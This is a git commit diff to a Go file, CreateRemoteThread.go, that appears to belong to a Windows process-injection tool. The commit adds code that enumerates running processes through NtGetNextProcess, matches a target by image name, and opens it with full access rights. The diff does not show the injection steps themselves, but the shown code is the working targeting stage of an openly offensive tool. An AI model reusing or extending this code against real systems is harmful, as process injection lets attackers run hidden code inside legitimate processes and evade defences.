37e6aa0de5a9455d0c6d39ac30d4a950d973e9ee
Ricardo Ruiz <ricardojruiz93@gmail.com>
2023-12-06 14:38:44 +0100

    Add files via upload

--- CreateRemoteThread.go
+++ CreateRemoteThread.go
@@ -4,10 +4,11 @@ import "os"
 import "fmt"
 import "syscall"
 import "unsafe"
-import "strconv"
+import "strings"
+import "unicode/utf8"
 
 
-func OpenProcess(processAccess int, bInheritHandle int, processId int) uintptr {
+func OpenProcess(processAccess int, bInheritHandle int, processId uintptr) uintptr {
    ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("OpenProcess").Call(
       uintptr(processAccess),
       uintptr(bInheritHandle),
@@ -62,18 +63,84 @@ func CloseHandle(hProcess uintptr) uintptr {
 }
 
 
-func main() {
-   pid := os.Args[1]
-   pid_int, err := strconv.Atoi(pid)
-   fmt.Println("[+] Process PID: \t\t", pid);
-   
-   if err != nil {
-      fmt.Println("Error during conversion")
-      return
+func NtGetNextProcess(handle uintptr, MAX_ALLOWED int, param3 int, param4 int, outHandle uintptr) uintptr {
+   ret, _, _ := syscall.NewLazyDLL("ntdll.dll").NewProc("NtGetNextProcess").Call(
+      uintptr(handle),
+      uintptr(MAX_ALLOWED),
+      uintptr(param3),
+      uintptr(param4),
+      uintptr(outHandle),
+   )
+   return uintptr(ret)
+}
+
+
+func GetProcessImageFileName(hProcess uintptr, lpImageFileName uintptr, nSize int) uintptr {
+   ret, _, _ := syscall.NewLazyDLL("psapi.dll").NewProc("GetProcessImageFileNameA").Call(
+      uintptr(hProcess),
+      uintptr(lpImageFileName),
+      uintptr(nSize),
+   )
+   return uintptr(ret)
+}
+
+
+func GetProcessId(handle uintptr) uintptr {
+   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("GetProcessId").Call(
+      uintptr(handle),
+   )
+   return uintptr(ret)
+}
+
+
+func Reverse(s string) string {
+    size := len(s)
+    buf := make([]byte, size)
+    for start := 0; start < size; {
+        r, n := utf8.DecodeRuneInString(s[start:])
+        start += n
+        utf8.EncodeRune(buf[size-start:], r)
+    }
+    return string(buf)
+}
+
+
+func GetProcessByName(process_name string) []uintptr{
+   var proc_handles_slice []uintptr;
+   var MAXIMUM_ALLOWED int = 0x02000000;
+   var s uintptr = 0;
+   for {
+      if (NtGetNextProcess(s, MAXIMUM_ALLOWED, 0, 0, uintptr(unsafe.Pointer(&s))) != 0) { break }
+
+      buf := [256]byte{}
+      var mem_address uintptr = uintptr(unsafe.Pointer(&buf[0])); 
+      var res uintptr = GetProcessImageFileName(s, mem_address, len(buf));
+
+      if (res > 1){
+         var res_string string = string(buf[0:res]);
+         var reverted_string string = Reverse(res_string);
+         var index int = strings.Index(reverted_string, "\\");
+         var result_name string = Reverse(reverted_string[0:index]);
+         if (result_name == process_name){
+            // fmt.Println("[+] Process handle: \t", s, "(", fmt.Sprintf("0x%x", s), ")");
+            // fmt.Println("[+] Process name:   \t", process_name);
+            proc_handles_slice = append(proc_handles_slice, s);
+         }
+      }
    }
+   return proc_handles_slice;
+}
+
+
+func main() {
+   process_name := os.Args[1]
+   var proc_handles_slice []uintptr = GetProcessByName(process_name);
+   var first_proc = proc_handles_slice[0];
+   var pid uintptr = GetProcessId(first_proc);
+   fmt.Println("[+] Process PID: \t\t", pid);
 
    // OpenProcess
-   var proc_handle uintptr = OpenProcess(0x001F0FFF, 0, pid_int);
+   var proc_handle uintptr = OpenProcess(0x001F0FFF, 0, pid);
    if (proc_handle == 0){
       fmt.Println("[-] OpenProcess API call failed. ");
       os.Exit(-1);
